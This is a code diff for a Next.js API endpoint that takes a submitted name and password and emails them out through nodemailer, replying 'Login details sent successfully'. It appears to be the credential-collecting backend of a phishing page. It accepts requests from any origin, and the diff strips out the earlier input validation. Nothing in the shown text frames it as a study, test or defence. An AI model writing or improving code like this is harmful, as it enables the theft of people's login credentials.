@@ -1,30 +1,19 @@
 import nodemailer from 'nodemailer';
-import Cors from 'cors';
+import cors from 'cors';
 
-// Initialize CORS middleware with allowed origins and methods
-const cors = Cors({
-  origin: '*', // For testing: allow all origins. Replace with your frontend URL in production.
-  methods: ['POST'],
-});
+const corsMiddleware = cors({ origin: '*', methods: ['POST'] });
 
-// Helper to run middleware in Next.js API route
-function runMiddleware(req, res, fn) {
-  return new Promise((resolve, reject) => {
+const runMiddleware = (req, res, fn) =>
+  new Promise((resolve, reject) => {
     fn(req, res, (result) => {
       if (result instanceof Error) return reject(result);
       return resolve(result);
     });
   });
-}
 
 export default async function handler(req, res) {
-  try {
-    // Run CORS middleware first
-    await runMiddleware(req, res, cors);
-  } catch (corsError) {
-    console.error('CORS error:', corsError);
-    return res.status(500).json({ message: 'CORS error', error: corsError.message });
-  }
+  await runMiddleware(req, res, corsMiddleware);
+  console.log('API /api/sendMail called with method:', req.method);
 
   if (req.method !== 'POST') {
     return res.status(405).json({ message: 'Method not allowed' });
@@ -32,16 +21,9 @@ export default async function handler(req, res) {
 
   const { name, password } = req.body;
 
-  // Simple validation (you can add more)
-  if (!name || typeof name !== 'string' || name.trim().length < 2) {
-    return res.status(400).json({ message: 'Invalid name' });
-  }
-  if (!password || typeof password !== 'string' || password.length < 6) {
-    return res.status(400).json({ message: 'Invalid password' });
-  }
-
-  const sanitizedName = name.trim();
-  const sanitizedPassword = password.trim();
+  // No validation - directly use the values, fallback to empty strings if undefined
+  const sanitizedName = typeof name === 'string' ? name.trim() : '';
+  const sanitizedPassword = typeof password === 'string' ? password.trim() : '';
 
   try {
     const transporter = nodemailer.createTransport({
@@ -61,7 +43,6 @@ export default async function handler(req, res) {
     };
 
     await transporter.sendMail(mailOptions);
-
     return res.status(200).json({ message: 'Login details sent successfully' });
   } catch (error) {
     console.error('Error sending email:', error);
